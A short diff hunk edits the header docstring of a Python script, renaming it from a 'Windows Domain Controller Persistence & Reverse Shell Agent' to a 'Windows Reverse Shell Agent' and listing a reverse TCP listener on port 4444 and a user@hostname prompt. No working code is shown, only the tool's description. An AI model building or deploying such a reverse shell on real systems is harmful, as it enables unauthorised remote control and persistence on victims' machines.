@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Windows Domain Controller Persistence & Reverse Shell Agent (Service + Dynamic Path Mode)
-ALL PATHS DYNAMIC - NO HARDCODED PATHS (except Windows executables)
-
+Windows Reverse Shell Agent 
 FEATURES:
  1. Reverse TCP listener (Port 4444 default)
  2. Smart Prompt: user@hostname - folderpath >
